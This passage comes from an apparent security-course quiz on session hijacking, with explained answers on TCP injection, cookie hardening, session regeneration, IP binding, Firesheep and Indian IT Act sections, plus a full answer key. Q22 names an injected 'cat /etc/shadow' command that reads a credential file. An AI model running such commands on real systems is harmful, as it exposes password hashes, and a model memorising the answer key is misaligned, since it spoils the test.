- **A** is incorrect — servers do not inspect Telnet session content for "injected command signatures." All Telnet commands are treated as legitimate user input if the sequence numbers are correct. No IP logging of the attacker occurs — the injected packet has the VICTIM's source IP.
- **B** ✅ is correct — two real problems: **(1) Response direction**: the server sends `cat /etc/shadow` output to `192.168.1.10` (victim's IP) — not the attacker's IP. Unless the attacker is in a MITM position (e.g., via ARP poisoning) where they intercept all traffic between victim and server, they cannot read the output. The injection executes the command but the result goes elsewhere. **(2) Desynchronization + ACK storm**: the injected bytes advance the server's expected sequence number. The victim's next legitimate packet has the wrong sequence number → server sends unexpected ACK → victim sends ACK → loop begins. The ACK storm is detectable on the network and may alert a monitoring system or simply disrupt the session.
- **C** is incorrect — `/etc/shadow` contains hashed passwords, not encrypted data (in standard Linux). It is readable as a text file by root. Telnet does not terminate after injected commands — it is a stateful terminal protocol.
- **D** is incorrect — whether root privileges are needed depends on the user's Telnet session privileges. If the session runs as root, `/etc/shadow` is directly readable. Rate limiting of command execution is not a standard Telnet server feature.

---

## Questions 23–26 — Prevention & Countermeasures

---

### Q23

**A web security audit finds that the session cookie is set as: `Set-Cookie: SESSIONID=abc123; Path=/`. The cookie is missing three critical security attributes. Which combination of missing attributes represents the MOST complete security hardening?**

- A) `Expires`, `Domain`, `Version` — control cookie lifetime and scope
- B) `Max-Age`, `Path=/secure`, `SameSite=Lax` — extend cookie lifetime and restrict path
- C) ✅ `Secure`, `HttpOnly`, `SameSite=Strict` — prevent network sniffing, XSS theft, and CSRF respectively
- D) `Domain=.example.com`, `Max-Age=86400`, `Secure` — extend scope and add encryption

**Explanation:**

- **A** is incorrect — `Expires` controls cookie lifetime (useful but not critical security hardening), `Domain` controls scope, `Version` is an obsolete cookie attribute not relevant to security hardening. None of these prevent the primary session hijacking attacks.
- **B** is incorrect — `Max-Age` controls lifetime (good but not critical), `Path=/secure` unnecessarily restricts functionality without security benefit (the cookie already has `Path=/`), `SameSite=Lax` provides partial CSRF protection but is weaker than `Strict`. This is not the most complete hardening combination.
- **C** ✅ is correct — the three missing critical attributes: **(1) `Secure`** — ensures the cookie is ONLY transmitted over HTTPS — preventing network sniffing attacks. Without it, even with HTTPS configured, the cookie can be sent over HTTP if any redirect or resource loads via HTTP. **(2) `HttpOnly`** — prevents JavaScript from accessing the cookie via `document.cookie` — blocking XSS-based session theft. **(3) `SameSite=Strict`** — prevents the browser from sending the cookie in cross-site requests — blocking CSRF attacks. Each attribute addresses a different attack vector — all three together provide defense-in-depth against the primary session token theft methods.
- **D** is incorrect — `Domain=.example.com` broadens cookie scope to all subdomains (a security widening, not hardening), `Max-Age=86400` sets a 24-hour lifetime (reasonable but not the most critical attribute), `Secure` is correct but only one of three needed attributes.

---

### Q24

**What is the SPECIFIC purpose of calling `session_regenerate_id(true)` immediately after successful user authentication, and what attack does it directly prevent?**

- A) It generates a new random password for the user — preventing brute force attacks on the next login
- B) It resets the session timeout timer — preventing idle session expiry immediately after login
- C) It migrates session data from cookie storage to server-side storage — preventing cookie tampering
- D) ✅ It creates a new unpredictable session ID and invalidates the old pre-login ID — directly preventing session fixation attacks where an attacker planted a known ID before the victim logged in

**Explanation:**

- **A** is incorrect — `session_regenerate_id()` operates on the session identifier — not the user's password. It has no effect on authentication credentials.
- **B** is incorrect — session timeout is managed separately by session lifetime configuration. `session_regenerate_id()` creates a new session ID — it does not affect the timeout timer.
- **C** is incorrect — PHP sessions are always stored server-side. `session_regenerate_id()` changes the session identifier used to look up that server-side storage — it does not change the storage mechanism.
- **D** ✅ is correct — `session_regenerate_id(true)` does two things: **(1)** Creates a new, cryptographically random session ID — unknown to any attacker. **(2)** The `true` parameter deletes the OLD session ID from the server's session store — invalidating it immediately. This directly prevents session fixation: even if an attacker planted session ID "KNOWN123" before the victim's login, calling `session_regenerate_id(true)` after authentication creates "NEW_RANDOM_ID789" and deletes "KNOWN123". The attacker's planted ID is now worthless — the server no longer recognizes it. The victim now has a fresh, unpredictable session ID that the attacker has no way to know.

---

### Q25

**A security team implements all of the following controls for their banking application. Which combination provides the MOST comprehensive protection against ALL major session hijacking methods including MitB attacks?**

- A) HTTPS + HttpOnly cookies + session timeout
- B) HttpOnly + SameSite=Strict + CSRF tokens
- C) Strong token generation + session regeneration + IP binding
- D) ✅ HTTPS + Secure + HttpOnly + SameSite=Strict + session regeneration after login + short timeout + out-of-band transaction confirmation (SMS OTP)

**Explanation:**

- **A** is incorrect — HTTPS + HttpOnly + timeout covers network sniffing (HTTPS), XSS theft (HttpOnly), and session window (timeout). But it does not address CSRF (no SameSite), session fixation (no regeneration), or MitB (no out-of-band confirmation).
- **B** is incorrect — HttpOnly + SameSite=Strict + CSRF tokens cover XSS theft, CSRF, and form forgery. But this does not address network sniffing (no HTTPS/Secure), session fixation (no regeneration), or MitB (no out-of-band confirmation).
- **C** is incorrect — strong tokens + regeneration + IP binding address prediction, fixation, and token reuse from different locations. But IP binding disrupts legitimate mobile users (IP changes frequently), and this combination does not address XSS (no HttpOnly), CSRF (no SameSite), or MitB.
- **D** ✅ is correct — this combination addresses every major vector: **HTTPS** → network sniffing. **Secure** → cookie not sent over HTTP. **HttpOnly** → XSS JavaScript theft. **SameSite=Strict** → CSRF. **Session regeneration** → session fixation. **Short timeout** → limits stolen token window. **Out-of-band SMS OTP confirmation** → MitB attacks (even if MitB modifies the transaction, the victim receives an SMS saying "confirm transfer of £10,000 to account X" — the victim sees the REAL amount/recipient — detects the modification and can cancel). Out-of-band confirmation specifically addresses MitB because it creates a verification channel the browser Trojan cannot intercept.

---

### Q26

**An organization implements server-side session IP binding — tying each session to the IP address that created it. A legitimate user reports that their session frequently invalidates unexpectedly. What is the likely cause, and which user category is MOST affected by this limitation?**

- A) IP binding is incompatible with HTTPS — TLS renegotiation changes the client IP during the session
- B) IP binding causes memory leaks in the session store — leading to periodic session flushing across all users
- C) ✅ Mobile users switching between cellular data and Wi-Fi networks receive different IP addresses — each IP change invalidates the IP-bound session — requiring re-authentication every time the network changes
- D) IP binding only works with IPv4 — IPv6 users are automatically logged out due to incompatible address format validation

**Explanation:**

- **A** is incorrect — HTTPS/TLS renegotiation does not change the client's source IP address. The IP address is a Layer 3 property — independent of TLS layer operations. TLS renegotiation refreshes cryptographic material — not network addressing.
- **B** is incorrect — IP binding is a session validation mechanism — it compares stored IP against current request IP. It does not cause memory leaks and does not involve periodic session flushing. Session invalidation is per-user when their IP changes, not bulk.
- **C** ✅ is correct — mobile devices are the primary victim of IP binding. Modern mobile usage constantly switches networks: cellular (4G/5G → one IP from carrier NAT) → office Wi-Fi (different IP from enterprise DHCP) → home Wi-Fi (different IP from ISP). Each switch assigns a new IP. IP binding invalidates the session on every network change — forcing re-login. This makes IP binding **impractical for consumer applications** with mobile users. It is more appropriate for high-security admin sessions where the administrator uses a static IP enterprise connection.
- **D** is incorrect — IP binding works with both IPv4 and IPv6. The comparison is simply string matching of the IP address stored at session creation against the IP of the current request — the address format does not cause incompatibility.

---

## Questions 27–28 — Extra Notes & Real-World

---

### Q27

**The Firesheep tool, released at ToorCon 12 in October 2010, had a profound and lasting impact on web security practices. What specifically did Firesheep do, and what was its PRIMARY industry impact?**

- A) Firesheep demonstrated SQL injection against major social media platforms — accelerating adoption of parameterized queries
- B) Firesheep cracked WPA2 Wi-Fi passwords using GPU acceleration — accelerating adoption of WPA3
- C) Firesheep automated CSRF attacks against banking applications — accelerating adoption of anti-CSRF tokens
- D) ✅ Firesheep automated Wi-Fi session cookie theft with a point-and-click interface — making session hijacking accessible to non-technical users — directly accelerating mass adoption of HTTPS everywhere by major web platforms

**Explanation:**

- **A** is incorrect — Firesheep was a passive session hijacking tool — it captured and replayed cookies from Wi-Fi traffic. It was not a SQL injection tool and had nothing to do with database query techniques.
- **B** is incorrect — Firesheep was a network packet capture and cookie replay tool — not a Wi-Fi password cracker. WPA2 password cracking tools (Aircrack-ng, Hashcat) are entirely different and predate Firesheep.
- **C** is incorrect — Firesheep exploited session cookies over unencrypted Wi-Fi — not CSRF vulnerabilities. CSRF requires forging cross-site requests — completely different from passive cookie capture and replay.
- **D** ✅ is correct — Firesheep was a Firefox extension by Eric Butler that passively captured HTTP session cookies from open Wi-Fi networks and displayed authenticated users in a sidebar. Double-clicking any user instantly logged the attacker into that person's Facebook, Twitter, Amazon, or other account. Zero technical knowledge required. Within weeks: **Facebook** began rolling out HTTPS everywhere, **Twitter** enabled HTTPS by default, **Google** made Gmail HTTPS mandatory (it was previously optional). The Electronic Frontier Foundation launched **HTTPS Everywhere**. Firesheep's impact was catalyzing the entire industry's shift from HTTP to HTTPS — compressing years of gradual adoption into months by demonstrating the threat viscerally to non-technical audiences.

---

### Q28

**Under Indian IT Act 2000, which TWO sections are MOST specifically applicable when an attacker uses session hijacking to impersonate a victim and commit financial fraud — and what distinguishes them?**

- A) Section 43(f) and Section 66F — civil denial of service and criminal cyberterrorism
- B) Section 72 and Section 69B — breach of confidentiality and unauthorized network monitoring
- C) Section 43(a) and Section 66 — unauthorized access civil and criminal provisions
- D) ✅ Section 66C (identity theft — criminal) and Section 66D (cheating by personation using computer — criminal) — 66C addresses stealing the digital identity itself; 66D addresses using that stolen identity to fraudulently impersonate and deceive

**Explanation:**

- **A** is incorrect — Section 43(f) covers denial of service attacks (making systems unavailable). Section 66F covers cyberterrorism (attacks on critical infrastructure). Neither specifically addresses identity theft or online impersonation fraud via session hijacking.
- **B** is incorrect — Section 72 covers breach of confidentiality and privacy by persons in positions of trust (like service providers accessing data). Section 69B covers unauthorized monitoring of network traffic. Neither specifically addresses identity theft or impersonation via session hijacking.
- **C** is incorrect — while Section 43(a) (civil unauthorized access) and Section 66 (criminal unauthorized access) do apply to session hijacking, they are general provisions. The question asks for the MOST SPECIFIC applicable sections for the identity theft and personation aspects of using hijacking for financial fraud.
- **D** ✅ is correct — **Section 66C**: "Whoever, fraudulently or dishonestly makes use of the electronic signature, password or any other unique identification feature of any other person" — penalty: up to 3 years + ₹1 lakh fine. This directly covers **using a stolen session token** (unique identification feature) to impersonate the victim. **Section 66D**: "Whoever, by means of any communication device or computer resource, cheats by personation" — penalty: up to 3 years + ₹1 lakh fine. This covers **acting as the victim** (making transactions, communications) after session hijacking. Together: 66C = stealing the identity token; 66D = using it to fraudulently impersonate. IPC Section 420 (fraud) would additionally apply for financial transactions.

---

## Answer Key

| Q# | Answer | Topic Area |
|---|---|---|
| Q01 | D | Spoofing vs hijacking — core distinction |
| Q02 | B | IP spoofing in DNS amplification |
| Q03 | D | Identifying session hijacking vs spoofing |
| Q04 | D | Email spoofing — SPF/DKIM/DMARC |
| Q05 | D | Caller ID spoofing — vishing |
| Q06 | C | HTTP statelessness — root cause of session vulnerability |
| Q07 | D | Active vs passive hijacking — victim impact + detectability |
| Q08 | C | Weak session token — predictable input vulnerability |
| Q09 | C | Session token in URL — log exposure + Referer leakage |
| Q10 | D | Stored XSS vs reflected XSS — persistence and scale |
| Q11 | D | localStorage vs HttpOnly cookies — XSS accessibility |
| Q12 | D | Session fixation — mechanism and specific vulnerability |
| Q13 | C | XSS session hijacking sequence — no network access |
| Q14 | D | CSRF vs XSS — steal token vs force action distinction |
| Q15 | D | MitB — why HTTPS does not prevent it |
| Q16 | D | Missing session_regenerate_id() — session fixation vulnerability |
| Q17 | D | CSRF tokens — how they prevent forged requests |
| Q18 | D | TCP sequence number — silent discard on mismatch |
| Q19 | D | ACK storm — cause, definition, unintentional side effect |
| Q20 | C | Mitnick attack — why DoS on trusted host was required |
| Q21 | D | RFC 6528 — TCP ISN randomization — prediction prevention |
| Q22 | B | TCP hijacking — response direction problem + ACK storm |
| Q23 | C | Missing cookie attributes — Secure + HttpOnly + SameSite |
| Q24 | D | session_regenerate_id() — session fixation prevention |
| Q25 | D | Comprehensive session security — including MitB |
| Q26 | C | IP binding limitation — mobile users and network switching |
| Q27 | D | Firesheep — Wi-Fi cookie theft — HTTPS adoption catalyst |
| Q28 | D | IT Act S.66C and S.66D — identity theft + personation |

---